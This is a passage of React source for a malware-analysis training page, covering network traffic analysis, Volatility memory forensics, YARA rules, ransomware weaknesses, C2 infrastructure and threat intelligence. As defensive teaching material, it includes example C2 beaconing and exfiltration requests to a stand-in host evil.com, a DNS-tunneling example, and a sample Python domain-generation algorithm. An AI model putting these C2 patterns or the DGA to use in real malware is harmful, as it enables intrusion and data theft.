              Many malware samples encrypt strings and decrypt them at runtime. To extract them:<br />
              <strong>1.</strong> Find the decryption function (often called many times)<br />
              <strong>2.</strong> Set breakpoint on return, log the result<br />
              <strong>3.</strong> Or use FLOSS which emulates decryption routines<br />
              <strong>4.</strong> For XOR encryption: identify key, write IDA/Ghidra script to decrypt statically
            </Typography>
          </Alert>
        </Paper>

        {/* ==================== SECTION 9: NETWORK TRAFFIC ANALYSIS ==================== */}
        <Paper
          id="network-analysis-content"
          sx={{
            p: 4,
            mb: 4,
            borderRadius: 3,
            bgcolor: alpha("#0ea5e9", 0.02),
            border: `1px solid ${alpha("#0ea5e9", 0.1)}`,
            scrollMarginTop: 96,
          }}
        >
          <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 3 }}>
            <Box
              sx={{
                width: 56,
                height: 56,
                borderRadius: 2,
                bgcolor: alpha("#0ea5e9", 0.15),
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                color: "#0ea5e9",
              }}
            >
              <NetworkCheckIcon sx={{ fontSize: 32 }} />
            </Box>
            <Box>
              <Typography variant="h5" sx={{ fontWeight: 800, color: "#0ea5e9" }}>
                9. Network Traffic Analysis
              </Typography>
              <Chip label="Complete" size="small" sx={{ mt: 0.5, bgcolor: alpha("#22c55e", 0.15), color: "#22c55e", fontWeight: 600 }} />
            </Box>
          </Box>

          <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
            Analyzing network traffic reveals C2 communication, data exfiltration, and download behavior. 
            Capturing and decoding this traffic is essential for understanding malware capabilities 
            and extracting IOCs (Indicators of Compromise) for detection.
          </Typography>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#0ea5e9" }}>
            Network Analysis Tools
          </Typography>

          <Grid container spacing={3} sx={{ mb: 4 }}>
            {[
              {
                name: "Wireshark",
                desc: "Full packet capture and analysis, protocol dissectors",
                use: "Detailed traffic inspection, following streams, export objects",
                filters: "ip.addr==x.x.x.x, http.request, dns, tcp.port==443",
              },
              {
                name: "FakeNet-NG",
                desc: "Intercepts and redirects all network traffic to local server",
                use: "Simulates internet for isolated VM, logs all requests",
                filters: "Automatic logging, SSL interception, custom responses",
              },
              {
                name: "INetSim",
                desc: "Linux-based internet simulation suite (15+ services)",
                use: "REMnux integration, HTTP/DNS/SMTP/FTP simulation",
                filters: "Service-specific logs, custom response files",
              },
              {
                name: "mitmproxy",
                desc: "Interactive HTTPS proxy with Python scripting",
                use: "Intercept HTTPS traffic, modify requests/responses",
                filters: "Flow filters, scripted modifications",
              },
            ].map((tool, idx) => (
              <Grid item xs={12} sm={6} key={idx}>
                <Paper sx={{ p: 2.5, height: "100%", borderRadius: 2, bgcolor: alpha("#0ea5e9", 0.03), border: `1px solid ${alpha("#0ea5e9", 0.15)}` }}>
                  <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#0ea5e9", mb: 1 }}>{tool.name}</Typography>
                  <Typography variant="body2" sx={{ mb: 1 }}>{tool.desc}</Typography>
                  <Typography variant="body2" color="text.secondary" sx={{ fontSize: "0.8rem", mb: 0.5 }}>
                    <strong>Best for:</strong> {tool.use}
                  </Typography>
                  <Typography variant="body2" color="text.secondary" sx={{ fontSize: "0.8rem" }}>
                    <strong>Filters:</strong> <code>{tool.filters}</code>
                  </Typography>
                </Paper>
              </Grid>
            ))}
          </Grid>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#0ea5e9" }}>
            Common C2 Communication Patterns
          </Typography>

          <Paper sx={{ p: 3, mb: 3, borderRadius: 2, bgcolor: "background.default" }}>
            <Typography variant="body2" component="pre" sx={{ fontFamily: "monospace", fontSize: "0.85rem", overflow: "auto" }}>
{`# HTTP-Based C2

## Beaconing (Check-in)
GET /index.php?id=<bot_id>&cmd=poll HTTP/1.1
Host: evil.com
# Regular intervals (every 60s, 5min, etc.)
# Look for: Consistent timing, unique query parameters

## Command Response
POST /gate.php HTTP/1.1
Host: evil.com
Content-Type: application/x-www-form-urlencoded

data=<base64_encoded_stolen_data>

## Download Payload
GET /update.exe HTTP/1.1
GET /payload.dll HTTP/1.1
# Or disguised: GET /images/logo.png (but actually PE file)

# DNS-Based C2 (DNS Tunneling)
<encoded_data>.evil.com
# Data exfiltration through DNS TXT queries
# Look for: Long subdomains, high query volume, TXT queries

# HTTPS C2
# Same as HTTP but encrypted
# Requires SSL interception (mitmproxy, Burp)
# Or analyze certificate, domain, JA3 fingerprint

# Common Indicators
- User-Agent: Missing, outdated, or malware-specific strings
- Timing: Regular intervals (beaconing)
- Encoding: Base64, XOR, or custom encoding in parameters
- Domains: DGA domains, newly registered, suspicious TLDs
- Certificate: Self-signed, free CAs for malicious domains`}
            </Typography>
          </Paper>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#0ea5e9" }}>
            Wireshark Analysis Workflow
          </Typography>

          <Grid container spacing={2} sx={{ mb: 3 }}>
            {[
              { step: "1", title: "Capture Setup", desc: "Capture on correct interface (VM network adapter), start before running malware" },
              { step: "2", title: "Initial Triage", desc: "Statistics  Endpoints, Conversations, Protocol Hierarchy for overview" },
              { step: "3", title: "DNS Analysis", desc: "Filter: dns - Look for unusual domains, DGA patterns, tunneling" },
              { step: "4", title: "HTTP/HTTPS", desc: "Filter: http - Follow streams, extract files (File  Export Objects  HTTP)" },
              { step: "5", title: "Extract IOCs", desc: "Note IPs, domains, URLs, user-agents for blocking/detection" },
              { step: "6", title: "Timeline", desc: "View  Time Display Format  UTC, correlate with system events" },
            ].map((item, idx) => (
              <Grid item xs={12} sm={6} md={4} key={idx}>
                <Paper sx={{ p: 2, height: "100%", borderRadius: 2, bgcolor: alpha("#0ea5e9", 0.03), border: `1px solid ${alpha("#0ea5e9", 0.1)}` }}>
                  <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 1 }}>
                    <Chip label={item.step} size="small" sx={{ bgcolor: "#0ea5e9", color: "white", fontWeight: 700 }} />
                    <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>{item.title}</Typography>
                  </Box>
                  <Typography variant="body2" color="text.secondary">{item.desc}</Typography>
                </Paper>
              </Grid>
            ))}
          </Grid>

          <Alert severity="warning" sx={{ borderRadius: 2 }}>
            <AlertTitle sx={{ fontWeight: 700 }}>Decrypting HTTPS Traffic</AlertTitle>
            <Typography variant="body2">
              Modern malware uses HTTPS. To inspect:<br />
              <strong>mitmproxy:</strong> Install CA cert in VM, run mitmproxy as proxy, intercept all HTTPS<br />
              <strong>SSLKEYLOGFILE:</strong> Set env var, browsers/some apps log pre-master secrets for Wireshark<br />
              <strong>JA3 Fingerprinting:</strong> Even encrypted, TLS handshake pattern can identify malware families
            </Typography>
          </Alert>
        </Paper>

        {/* ==================== SECTION 10: MEMORY FORENSICS ==================== */}
        <Paper
          id="memory-forensics-content"
          sx={{
            p: 4,
            mb: 4,
            borderRadius: 3,
            bgcolor: alpha("#dc2626", 0.02),
            border: `1px solid ${alpha("#dc2626", 0.1)}`,
            scrollMarginTop: 96,
          }}
        >
          <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 3 }}>
            <Box
              sx={{
                width: 56,
                height: 56,
                borderRadius: 2,
                bgcolor: alpha("#dc2626", 0.15),
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                color: "#dc2626",
              }}
            >
              <MemoryIcon sx={{ fontSize: 32 }} />
            </Box>
            <Box>
              <Typography variant="h5" sx={{ fontWeight: 800, color: "#dc2626" }}>
                10. Memory Forensics
              </Typography>
              <Chip label="Complete" size="small" sx={{ mt: 0.5, bgcolor: alpha("#22c55e", 0.15), color: "#22c55e", fontWeight: 600 }} />
            </Box>
          </Box>

          <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
            Memory forensics analyzes RAM dumps to find malware that exists only in memory, detect 
            code injection, uncover hidden processes, and extract decrypted code/data. This is crucial 
            for analyzing fileless malware and packed samples.
          </Typography>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#dc2626" }}>
            Memory Acquisition
          </Typography>

          <Grid container spacing={2} sx={{ mb: 4 }}>
            {[
              { name: "VM Snapshot", desc: "Suspend VM, .vmem file IS the memory dump (VMware)", best: "Most reliable for malware analysis" },
              { name: "WinPmem", desc: "Kernel driver-based acquisition tool", best: "Live systems, creates raw dump" },
              { name: "FTK Imager", desc: "AccessData's forensic acquisition tool", best: "Enterprise forensics, multiple formats" },
              { name: "Magnet RAM Capture", desc: "Free tool from Magnet Forensics", best: "Quick live capture, minimal footprint" },
              { name: "DumpIt", desc: "Single executable, creates raw dump", best: "Simple incident response" },
              { name: "LiME", desc: "Linux Memory Extractor kernel module", best: "Linux systems memory acquisition" },
            ].map((tool, idx) => (
              <Grid item xs={12} sm={6} md={4} key={idx}>
                <Paper sx={{ p: 2, height: "100%", borderRadius: 2, bgcolor: alpha("#dc2626", 0.03), border: `1px solid ${alpha("#dc2626", 0.1)}` }}>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#dc2626" }}>{tool.name}</Typography>
                  <Typography variant="body2" color="text.secondary" sx={{ fontSize: "0.8rem", mb: 0.5 }}>{tool.desc}</Typography>
                  <Typography variant="body2" sx={{ fontSize: "0.8rem" }}><strong>Best:</strong> {tool.best}</Typography>
                </Paper>
              </Grid>
            ))}
          </Grid>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#dc2626" }}>
            Volatility 3 Essential Commands
          </Typography>

          <Paper sx={{ p: 3, mb: 3, borderRadius: 2, bgcolor: "background.default" }}>
            <Typography variant="body2" component="pre" sx={{ fontFamily: "monospace", fontSize: "0.85rem", overflow: "auto" }}>
{`# Basic Volatility 3 Usage
python vol.py -f memory.dmp <plugin>

# System Information
windows.info           # OS version, architecture, time
windows.envars         # Environment variables

# Process Analysis
windows.pslist         # List processes (like tasklist)
windows.psscan         # Find hidden/terminated processes
windows.pstree         # Process tree view
windows.cmdline        # Command line arguments
windows.dlllist        # DLLs loaded by each process

# Memory Analysis  
windows.malfind        # Find injected/suspicious code (RWX memory)
windows.vadinfo        # Virtual Address Descriptor info
windows.memmap         # Memory map per process

# Network
windows.netscan        # Network connections (open sockets)
windows.netstat        # Similar to netstat

# Code Injection Detection
windows.malfind        # Finds PAGE_EXECUTE_READWRITE with code
                       # MZ headers in non-image memory = injected

# Dump Suspicious Process
windows.pslist --dump --pid <PID>
windows.dumpfiles --pid <PID>  # Dump files from process memory

# Registry
windows.registry.hivelist    # List registry hives
windows.registry.printkey    # Print registry key values

# Example Workflow for Malware Hunting:
1. windows.psscan         # Find all processes including hidden
2. windows.malfind        # Find injected code
3. windows.netscan        # Check network connections
4. Dump suspicious PID    # Extract for further analysis`}
            </Typography>
          </Paper>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#dc2626" }}>
            Detecting Injection Techniques
          </Typography>

          <Grid container spacing={2} sx={{ mb: 3 }}>
            {[
              {
                name: "Process Hollowing",
                indicator: "Suspended process with replaced image",
                detect: "VAD shows mapped image but malfind shows different code at entry",
              },
              {
                name: "DLL Injection",
                indicator: "Unexpected DLL in process",
                detect: "dlllist shows DLL not in normal path or unknown name",
              },
              {
                name: "Reflective DLL Injection",
                indicator: "DLL loaded without LoadLibrary",
                detect: "malfind finds PE header in RWX memory not in modules list",
              },
              {
                name: "Process Doppelgnging",
                indicator: "Process from transacted file",
                detect: "Image differs from file on disk, uses NTFS transactions",
              },
              {
                name: "APC Injection",
                indicator: "Code queued to thread via APC",
                detect: "Unexpected RWX regions, threads with suspicious start addresses",
              },
              {
                name: "Atom Bombing",
                indicator: "Code stored in atom table",
                detect: "ROP chains, NtQueueApcThread patterns in memory",
              },
            ].map((item, idx) => (
              <Grid item xs={12} sm={6} key={idx}>
                <Paper sx={{ p: 2, borderRadius: 2, bgcolor: alpha("#dc2626", 0.03), border: `1px solid ${alpha("#dc2626", 0.1)}` }}>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#dc2626" }}>{item.name}</Typography>
                  <Typography variant="body2" sx={{ fontSize: "0.8rem", mb: 0.5 }}>
                    <strong>Sign:</strong> {item.indicator}
                  </Typography>
                  <Typography variant="body2" color="text.secondary" sx={{ fontSize: "0.8rem" }}>
                    <strong>Detect:</strong> {item.detect}
                  </Typography>
                </Paper>
              </Grid>
            ))}
          </Grid>

          <Alert severity="success" sx={{ borderRadius: 2 }}>
            <AlertTitle sx={{ fontWeight: 700 }}>Memory Analysis Tips</AlertTitle>
            <Typography variant="body2">
              <strong>malfind output:</strong> Look for MZ headers (4D 5A) in RWX memory = injected PE<br />
              <strong>Hollow process:</strong> PEB.ImageBaseAddress differs from mapped file<br />
              <strong>Parent spoofing:</strong> ppid doesn't match expected (explorer.exe children)<br />
              <strong>Extract strings:</strong> Run strings on dumped processes for IOCs
            </Typography>
          </Alert>
        </Paper>

        {/* ==================== SECTION 11: YARA RULES ==================== */}
        <Paper
          id="yara-rules-content"
          sx={{
            p: 4,
            mb: 4,
            borderRadius: 3,
            bgcolor: alpha("#22c55e", 0.02),
            border: `1px solid ${alpha("#22c55e", 0.1)}`,
            scrollMarginTop: 96,
          }}
        >
          <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 3 }}>
            <Box
              sx={{
                width: 56,
                height: 56,
                borderRadius: 2,
                bgcolor: alpha("#22c55e", 0.15),
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                color: "#22c55e",
              }}
            >
              <PolicyIcon sx={{ fontSize: 32 }} />
            </Box>
            <Box>
              <Typography variant="h5" sx={{ fontWeight: 800, color: "#22c55e" }}>
                11. YARA Rules & Signature Writing
              </Typography>
              <Chip label="Complete" size="small" sx={{ mt: 0.5, bgcolor: alpha("#22c55e", 0.15), color: "#22c55e", fontWeight: 600 }} />
            </Box>
          </Box>

          <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
            YARA is the pattern-matching Swiss Army knife of malware research. It allows you to create rules 
            that describe malware families based on textual or binary patterns. YARA rules are used for 
            malware identification, classification, and hunting across file systems and memory.
          </Typography>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#22c55e" }}>
            YARA Rule Structure
          </Typography>

          <Paper sx={{ p: 3, mb: 3, borderRadius: 2, bgcolor: "background.default" }}>
            <Typography variant="body2" component="pre" sx={{ fontFamily: "monospace", fontSize: "0.85rem", overflow: "auto" }}>
{`rule ExampleMalware {
    meta:
        author = "Your Name"
        description = "Detects Example Malware family"
        date = "2024-01-01"
        hash = "abc123..."
        reference = "https://blog.example.com/analysis"
    
    strings:
        // Text strings
        $str1 = "malicious string" ascii wide
        $str2 = "http://evil.com/gate.php" nocase
        
        // Hex patterns (with wildcards)
        $hex1 = { 4D 5A 90 00 }                    // MZ header
        $hex2 = { 68 ?? ?? ?? ?? FF 15 }          // push addr; call [addr]
        $hex3 = { 8B [2-4] 89 }                   // mov with variable gap
        
        // Regular expressions
        $re1 = /[A-Za-z0-9]{32}\\.exe/
        
    condition:
        uint16(0) == 0x5A4D and              // File starts with MZ
        filesize < 1MB and                    // Size limit
        (2 of ($str*) or $hex1) and          // String matching
        not $clean_string                     // Exclusion
}

// Condition operators:
// all of them          - All strings must match
// any of them          - At least one string
// 2 of ($a, $b, $c)   - At least 2 of specified
// #str1 > 5           - String appears more than 5 times
// @str1[1] < 100      - First occurrence before offset 100
// for all of ($*) : ( $ at entrypoint )  - All strings at EP`}
            </Typography>
          </Paper>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#22c55e" }}>
            Writing Effective Rules
          </Typography>

          <Grid container spacing={2} sx={{ mb: 3 }}>
            {[
              { tip: "Be Specific", desc: "Use unique strings/patterns that won't match legitimate software", icon: "" },
              { tip: "Combine Conditions", desc: "Use multiple weak indicators together for stronger detection", icon: "" },
              { tip: "Consider Performance", desc: "Put fast checks (filesize, magic bytes) first in conditions", icon: "" },
              { tip: "Test Thoroughly", desc: "Run against clean files to check for false positives", icon: "" },
              { tip: "Document Everything", desc: "Use meta section for author, date, hashes, references", icon: "" },
              { tip: "Use Modules", desc: "PE, ELF, math modules provide powerful built-in checks", icon: "" },
            ].map((item, idx) => (
              <Grid item xs={12} sm={6} md={4} key={idx}>
                <Paper sx={{ p: 2, height: "100%", borderRadius: 2, bgcolor: alpha("#22c55e", 0.03), border: `1px solid ${alpha("#22c55e", 0.1)}` }}>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 0.5 }}>{item.icon} {item.tip}</Typography>
                  <Typography variant="body2" color="text.secondary">{item.desc}</Typography>
                </Paper>
              </Grid>
            ))}
          </Grid>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#22c55e" }}>
            PE Module Example
          </Typography>

          <Paper sx={{ p: 3, mb: 3, borderRadius: 2, bgcolor: "background.default" }}>
            <Typography variant="body2" component="pre" sx={{ fontFamily: "monospace", fontSize: "0.85rem", overflow: "auto" }}>
{`import "pe"
import "math"

rule SuspiciousPE {
    meta:
        description = "Detects PE with suspicious characteristics"
    
    condition:
        pe.is_pe and
        pe.number_of_sections > 5 and
        pe.entry_point_raw < pe.sections[0].raw_data_offset and  // EP outside first section
        math.entropy(0, filesize) > 7.0 and                      // High entropy (packed)
        pe.imports("kernel32.dll", "VirtualAlloc") and
        pe.imports("kernel32.dll", "CreateRemoteThread")
}`}
            </Typography>
          </Paper>

          <Alert severity="info" sx={{ borderRadius: 2 }}>
            <AlertTitle sx={{ fontWeight: 700 }}>YARA Resources</AlertTitle>
            <Typography variant="body2">
              <strong>YARAify:</strong> VirusTotal's YARA rule database and testing<br />
              <strong>YARA-Rules GitHub:</strong> Community-contributed rule repository<br />
              <strong>yarGen:</strong> Automatic YARA rule generator from samples<br />
              <strong>YARA Editor (VSCode):</strong> Syntax highlighting and linting
            </Typography>
          </Alert>
        </Paper>

        {/* ==================== SECTION 12: RANSOMWARE ANALYSIS ==================== */}
        <Paper
          id="ransomware-analysis-content"
          sx={{
            p: 4,
            mb: 4,
            borderRadius: 3,
            bgcolor: alpha("#f97316", 0.02),
            border: `1px solid ${alpha("#f97316", 0.1)}`,
            scrollMarginTop: 96,
          }}
        >
          <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 3 }}>
            <Box
              sx={{
                width: 56,
                height: 56,
                borderRadius: 2,
                bgcolor: alpha("#f97316", 0.15),
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                color: "#f97316",
              }}
            >
              <VpnKeyIcon sx={{ fontSize: 32 }} />
            </Box>
            <Box>
              <Typography variant="h5" sx={{ fontWeight: 800, color: "#f97316" }}>
                12. Ransomware Analysis
              </Typography>
              <Chip label="Complete" size="small" sx={{ mt: 0.5, bgcolor: alpha("#22c55e", 0.15), color: "#22c55e", fontWeight: 600 }} />
            </Box>
          </Box>

          <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
            Ransomware encrypts victim files and demands payment for decryption. Analyzing ransomware involves 
            understanding its encryption implementation, key management, file targeting, and persistence. 
            Sometimes analysis reveals weaknesses that enable decryption without paying.
          </Typography>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#f97316" }}>
            Ransomware Analysis Checklist
          </Typography>

          <Grid container spacing={2} sx={{ mb: 4 }}>
            {[
              { phase: "Infection Vector", items: ["Email attachment", "Exploit kit", "RDP brute force", "Supply chain", "Malvertising"] },
              { phase: "Pre-Encryption", items: ["Process termination (databases, backups)", "Shadow copy deletion", "Service stopping", "Persistence installation", "Network discovery"] },
              { phase: "Encryption", items: ["Algorithm (AES, RSA, ChaCha20)", "Key generation method", "File targeting pattern", "Extension modification", "Ransom note creation"] },
              { phase: "Post-Encryption", items: ["C2 communication", "Key upload", "Wallpaper change", "Ransom note display", "Self-deletion"] },
            ].map((item, idx) => (
              <Grid item xs={12} sm={6} md={3} key={idx}>
                <Paper sx={{ p: 2, height: "100%", borderRadius: 2, bgcolor: alpha("#f97316", 0.03), border: `1px solid ${alpha("#f97316", 0.1)}` }}>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#f97316", mb: 1 }}>{item.phase}</Typography>
                  <List dense sx={{ py: 0 }}>
                    {item.items.map((i, j) => (
                      <ListItem key={j} sx={{ py: 0, pl: 0 }}>
                        <Typography variant="body2" sx={{ fontSize: "0.75rem" }}> {i}</Typography>
                      </ListItem>
                    ))}
                  </List>
                </Paper>
              </Grid>
            ))}
          </Grid>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#f97316" }}>
            Common Encryption Weaknesses
          </Typography>

          <Paper sx={{ p: 3, mb: 3, borderRadius: 2, bgcolor: "background.default" }}>
            <Typography variant="body2" component="pre" sx={{ fontFamily: "monospace", fontSize: "0.85rem", overflow: "auto" }}>
{`# Weaknesses That Enable Decryption:

## Weak Key Generation
- Using current time as seed (predictable)
- Using GetTickCount() or similar (limited entropy)
- Same key for all files (one known-plaintext breaks all)

## Implementation Flaws
- ECB mode (patterns visible in encrypted data)
- Stream cipher key reuse
- Partial encryption (only first/last N bytes)
- Key left in memory after encryption

## Key Management Issues
- Key generated locally but not uploaded (offline mode)
- Key stored in registry/file before deletion
- Static/hardcoded keys
- Private key embedded in binary

## Recovery Possibilities
1. Check for Volume Shadow Copies (vssadmin list shadows)
2. Look for backup keys in %TEMP%, %APPDATA%
3. Memory forensics during encryption
4. Key bruteforce (if weak PRNG)
5. No More Ransom project (nomoreransom.org)

# Tools for Ransomware Analysis
- ID Ransomware (id-ransomware.malwarehunterteam.com)
- No More Ransom decryptors
- emsisoft decryptors
- Kaspersky decryptors`}
            </Typography>
          </Paper>

          <Alert severity="warning" sx={{ borderRadius: 2 }}>
            <AlertTitle sx={{ fontWeight: 700 }}>Critical: Don't Encrypt Your Analysis VM!</AlertTitle>
            <Typography variant="body2">
              When analyzing ransomware, ensure:<br />
              <strong>1.</strong> Take snapshot BEFORE running<br />
              <strong>2.</strong> Disable shared folders with host<br />
              <strong>3.</strong> Isolate network completely<br />
              <strong>4.</strong> Have clean VM ready to restore<br />
              <strong>5.</strong> Keep sample files for testing (use honeypot directories)
            </Typography>
          </Alert>
        </Paper>

        {/* ==================== SECTION 13: C2 INFRASTRUCTURE ==================== */}
        <Paper
          id="c2-infrastructure-content"
          sx={{
            p: 4,
            mb: 4,
            borderRadius: 3,
            bgcolor: alpha("#8b5cf6", 0.02),
            border: `1px solid ${alpha("#8b5cf6", 0.1)}`,
            scrollMarginTop: 96,
          }}
        >
          <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 3 }}>
            <Box
              sx={{
                width: 56,
                height: 56,
                borderRadius: 2,
                bgcolor: alpha("#8b5cf6", 0.15),
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                color: "#8b5cf6",
              }}
            >
              <HubIcon sx={{ fontSize: 32 }} />
            </Box>
            <Box>
              <Typography variant="h5" sx={{ fontWeight: 800, color: "#8b5cf6" }}>
                13. C2 Infrastructure Analysis
              </Typography>
              <Chip label="Complete" size="small" sx={{ mt: 0.5, bgcolor: alpha("#22c55e", 0.15), color: "#22c55e", fontWeight: 600 }} />
            </Box>
          </Box>

          <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
            Command and Control (C2) infrastructure is how attackers communicate with compromised systems. 
            Understanding C2 protocols, domain generation algorithms, and infrastructure patterns helps 
            defenders block communications and track threat actors.
          </Typography>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#8b5cf6" }}>
            Common C2 Protocols
          </Typography>

          <Grid container spacing={2} sx={{ mb: 4 }}>
            {[
              { name: "HTTP/HTTPS", usage: "Most common, blends with normal traffic", indicators: "Unusual User-Agents, odd URL patterns, base64 in params" },
              { name: "DNS", usage: "Covert channel, hard to block", indicators: "Long subdomains, TXT queries, high query volume" },
              { name: "ICMP", usage: "Tunnel data in ping packets", indicators: "Large ICMP payloads, unusual frequency" },
              { name: "Custom TCP/UDP", usage: "Direct socket connections", indicators: "Non-standard ports, binary protocols" },
              { name: "Social Media", usage: "Commands via Twitter, GitHub, etc.", indicators: "API calls to social platforms, encoded posts" },
              { name: "Cloud Services", usage: "Dropbox, Google Drive, Slack", indicators: "Unexpected cloud API traffic" },
            ].map((item, idx) => (
              <Grid item xs={12} sm={6} key={idx}>
                <Paper sx={{ p: 2, borderRadius: 2, bgcolor: alpha("#8b5cf6", 0.03), border: `1px solid ${alpha("#8b5cf6", 0.1)}` }}>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#8b5cf6" }}>{item.name}</Typography>
                  <Typography variant="body2" sx={{ fontSize: "0.8rem", mb: 0.5 }}><strong>Use:</strong> {item.usage}</Typography>
                  <Typography variant="body2" color="text.secondary" sx={{ fontSize: "0.8rem" }}><strong>Indicators:</strong> {item.indicators}</Typography>
                </Paper>
              </Grid>
            ))}
          </Grid>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#8b5cf6" }}>
            Domain Generation Algorithms (DGA)
          </Typography>

          <Paper sx={{ p: 3, mb: 3, borderRadius: 2, bgcolor: "background.default" }}>
            <Typography variant="body2" component="pre" sx={{ fontFamily: "monospace", fontSize: "0.85rem", overflow: "auto" }}>
{`# DGA Overview
Malware generates domains algorithmically instead of hardcoding them.
Attacker registers a few; defenders can't block them all.

# Simple DGA Example (Python)
import datetime
import hashlib

def generate_domain(seed_date):
    seed = seed_date.strftime("%Y%m%d")
    domains = []
    for i in range(100):
        h = hashlib.md5(f"{seed}{i}".encode()).hexdigest()
        domain = h[:12] + ".com"
        domains.append(domain)
    return domains

# Today's domains:
# a1b2c3d4e5f6.com, b2c3d4e5f6a7.com, ...

# DGA Analysis Steps:
1. Find DGA function in disassembly
2. Identify seed (date, PRNG state, etc.)
3. Reimplement algorithm
4. Pre-generate domains for blocking/sinkholing
5. Check historical DNS data for registered domains

# DGA Detection
- High NXDomain ratio (most generated domains not registered)
- Domains with high entropy/randomness
- Burst of DNS queries to similar-looking domains
- Machine learning classifiers (char frequency, n-grams)`}
            </Typography>
          </Paper>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#8b5cf6" }}>
            C2 Analysis Workflow
          </Typography>

          <Grid container spacing={2} sx={{ mb: 3 }}>
            {[
              { step: "1", title: "Extract Indicators", desc: "Find hardcoded IPs, domains, URLs in strings and code" },
              { step: "2", title: "Identify Protocol", desc: "HTTP? DNS? Custom binary? Analyze packet captures" },
              { step: "3", title: "Decode Traffic", desc: "Base64, XOR, custom encoding - reverse the algorithm" },
              { step: "4", title: "Map Infrastructure", desc: "WHOIS, passive DNS, IP geolocation, SSL certs" },
              { step: "5", title: "Emulate C2", desc: "Create fake server to interact with malware safely" },
              { step: "6", title: "Document IOCs", desc: "Create STIX/TAXII format for sharing" },
            ].map((item, idx) => (
              <Grid item xs={12} sm={6} md={4} key={idx}>
                <Paper sx={{ p: 2, height: "100%", borderRadius: 2, bgcolor: alpha("#8b5cf6", 0.03), border: `1px solid ${alpha("#8b5cf6", 0.1)}` }}>
                  <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 1 }}>
                    <Chip label={item.step} size="small" sx={{ bgcolor: "#8b5cf6", color: "white", fontWeight: 700 }} />
                    <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>{item.title}</Typography>
                  </Box>
                  <Typography variant="body2" color="text.secondary">{item.desc}</Typography>
                </Paper>
              </Grid>
            ))}
          </Grid>

          <Alert severity="info" sx={{ borderRadius: 2 }}>
            <AlertTitle sx={{ fontWeight: 700 }}>Infrastructure Research Tools</AlertTitle>
            <Typography variant="body2">
              <strong>PassiveTotal (RiskIQ):</strong> Passive DNS, WHOIS history, certificates<br />
              <strong>VirusTotal Graph:</strong> Relationship visualization between IOCs<br />
              <strong>Shodan:</strong> Search for C2 servers by banner/certificate<br />
              <strong>URLhaus:</strong> Database of malicious URLs and their payloads
            </Typography>
          </Alert>
        </Paper>

        {/* ==================== SECTION 14: THREAT INTELLIGENCE ==================== */}
        <Paper
          id="threat-intel-content"
          sx={{
            p: 4,
            mb: 4,
            borderRadius: 3,
            bgcolor: alpha("#3b82f6", 0.02),
            border: `1px solid ${alpha("#3b82f6", 0.1)}`,
            scrollMarginTop: 96,
          }}
        >
          <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 3 }}>
            <Box
              sx={{
                width: 56,
                height: 56,
                borderRadius: 2,
                bgcolor: alpha("#3b82f6", 0.15),
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                color: "#3b82f6",
              }}
            >
              <AnalyticsIcon sx={{ fontSize: 32 }} />
            </Box>
            <Box>
              <Typography variant="h5" sx={{ fontWeight: 800, color: "#3b82f6" }}>
                14. Threat Intelligence Integration
              </Typography>
              <Chip label="Complete" size="small" sx={{ mt: 0.5, bgcolor: alpha("#22c55e", 0.15), color: "#22c55e", fontWeight: 600 }} />
            </Box>
          </Box>

          <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
            Threat intelligence connects your analysis to the broader security community. By sharing and 
            consuming IOCs (Indicators of Compromise), you can attribute malware to known actors, 
            discover related samples, and improve organizational defenses.
          </Typography>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#3b82f6" }}>
            Types of Indicators (IOCs)
          </Typography>

          <Grid container spacing={2} sx={{ mb: 4 }}>
            {[
              { type: "Network", examples: "IP addresses, domains, URLs, JA3 fingerprints", usage: "Firewall/proxy blocking, DNS sinkholing" },
              { type: "Host", examples: "File hashes (MD5/SHA256), file names, paths", usage: "EDR detection, file reputation checks" },
              { type: "Behavioral", examples: "Registry keys, mutex names, scheduled tasks", usage: "SIEM rules, hunting queries" },
              { type: "Email", examples: "Sender addresses, subject patterns, attachment names", usage: "Email gateway rules, phishing detection" },
            ].map((item, idx) => (
